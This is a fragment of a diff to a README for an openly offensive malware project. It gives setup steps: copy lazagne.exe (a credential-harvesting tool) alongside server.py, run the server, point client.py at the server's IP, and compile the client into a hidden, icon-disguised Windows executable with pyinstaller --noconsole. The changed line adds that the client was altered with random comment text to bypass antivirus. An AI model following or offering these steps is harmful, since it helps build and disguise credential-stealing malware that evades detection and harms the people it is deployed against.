@@ -39,7 +39,7 @@ Also copy lazagne.exe along with server.py to server machine
 python3 server.py
 ```
 #### 5. Craft client file (the malware)
-change ip address of host to servers ip address in client.py file 
+change ip address of host to servers ip address in client.py file. To do so find 114th line in client.py fill the ip address.(To by pass antivirus i have commented lines with some random text in between)
 ```bash
 pyinstaller.exe --onefile --icon=youricon.ico --noconsole --add-data="dat;." client.py
 ```
